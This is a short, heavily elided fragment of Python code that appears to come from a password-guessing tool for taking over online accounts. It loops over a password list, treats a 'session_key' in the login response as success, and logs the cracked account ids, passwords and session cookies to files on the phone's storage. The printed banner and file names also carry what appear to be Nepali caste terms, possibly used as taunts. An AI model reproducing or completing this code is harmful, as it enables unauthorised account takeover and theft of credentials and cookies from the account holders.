                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [AAKASH_KAMI_LE_HASIYA_MA_DHAR_LAGAYO-OK] '+ids+' | '+pas+'\033[1;97m')                                        
                                        open('/sdcard/AAKASH_DALIT_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/AAKASH_DALIT_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
